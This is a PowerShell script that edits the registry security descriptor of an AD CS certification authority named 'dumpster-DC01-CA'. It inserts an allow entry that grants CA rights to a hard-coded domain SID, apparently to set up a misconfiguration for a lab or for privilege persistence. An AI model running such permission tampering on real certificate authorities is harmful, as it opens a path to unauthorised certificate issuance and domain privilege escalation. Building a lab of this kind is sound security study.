$CAName       = "dumpster-DC01-CA"
$PrincipalSID = "S-1-5-21-2697957641-2271029196-387917394-2226"

$registryKeyPath    = "SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$CAName"
$securityDescriptor = Get-ItemProperty -Path "Registry::HKLM\$registryKeyPath" -Name "Security"
$securityObject     = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $securityDescriptor.Security, 0

# Create a new ACE
$aceFlags     = [System.Security.AccessControl.AceFlags]::None
$aceQualifier = [System.Security.AccessControl.AceQualifier]::AccessAllowed
$accessMask   = [Int32]200
$identity     = [System.Security.Principal.SecurityIdentifier]::new($PrincipalSID)
$isCallback   = $false
$opaque       = @()
$ace = New-Object System.Security.AccessControl.CommonAce($aceFlags, $aceQualifier, $accessMask, $identity, $isCallback, $opaque)

# Add new ACE
$securityObject.DiscretionaryAcl.InsertAce(0, $ace)
$out = new-object byte[] $securityObject.BinaryLength
$securityObject.GetBinaryForm($out,0)
Set-ItemProperty -Path "Registry::HKLM\$registryKeyPath" -Name "Security" -Value $out